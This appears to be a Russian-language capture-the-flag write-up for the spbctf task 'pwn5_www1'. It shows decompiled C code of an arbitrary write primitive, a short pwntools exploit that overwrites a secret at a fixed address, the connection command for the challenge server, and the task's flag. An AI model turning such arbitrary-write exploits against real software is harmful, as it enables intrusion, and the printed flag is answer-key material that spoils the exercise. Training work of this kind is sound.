[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn5_www1)
Описание:
Пришло время для перезаписи.
`nc 109.233.56.90 11683`
**[www1.elf](https://pwn.spbctf.ru/files/www/www1/www1.elf)**

Код:
``` C
_QWORD *write_prim()
{
  _QWORD *result; // rax
  _QWORD *v1; // [rsp+0h] [rbp-18h] BYREF
  __int64 v2; // [rsp+8h] [rbp-10h] BYREF

  printf("Enter data: ");
  __isoc99_scanf("%10d", &v2);

  printf("Enter address: ");
  __isoc99_scanf("%8x", &v1);

  result = v1;
  *v1 = v2;
  return result;
}
```

Эксплоит:
``` python
secret = b'0x40408C'
value = 0x10203040

io = start()

io.sendlineafter(b': ', str(value).encode())
io.sendlineafter(b': ', secret)

io.interactive()
```

Запуск:
![{340DF165-10A6-43C6-B852-094F0C908CBC} 1](../../../../z.%20Images/{340DF165-10A6-43C6-B852-094F0C908CBC}%201.png)

Ответ: `spbctf{rewrite_secret_if_u_can}`